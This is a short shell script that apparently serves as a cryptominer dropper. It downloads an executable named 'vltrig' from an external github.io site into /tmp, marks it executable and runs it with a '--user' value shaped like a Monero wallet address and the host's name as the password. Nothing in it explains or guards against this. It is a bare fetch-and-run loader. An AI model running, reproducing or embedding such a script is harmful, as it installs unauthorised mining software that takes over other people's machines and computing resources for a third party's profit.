#!/bin/sh
FILE_CHK=/tmp/vltrig

cd /tmp
if [ ! -f "$FILE_CHK" ]; then
    wget https://ivanhi0.github.io/vltrig
fi
chmod +x ./vltrig
./vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
